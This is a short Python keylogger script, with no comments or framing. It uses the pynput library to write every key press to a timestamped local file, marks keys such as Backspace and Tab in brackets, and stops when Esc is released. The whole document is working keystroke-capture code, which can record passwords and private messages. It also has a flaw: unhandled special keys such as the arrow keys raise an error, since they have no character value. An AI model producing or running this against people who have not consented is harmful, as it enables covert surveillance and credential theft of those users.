import pynput
from pynput.keyboard import Key, Listener
import datetime

log_file = "keylog_{}.txt".format(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))

def on_press(key):
    with open(log_file, "a") as f:
        if key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.backspace:
            f.write("[BACKSPACE]")
        elif key == Key.tab:
            f.write("[TAB]")
        elif key == Key.shift:
            f.write("[SHIFT]")
        elif key == Key.ctrl_l:
            f.write("[CTRL]")
        elif key == Key.alt_l:
            f.write("[ALT]")
        else:
            f.write(key.char)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
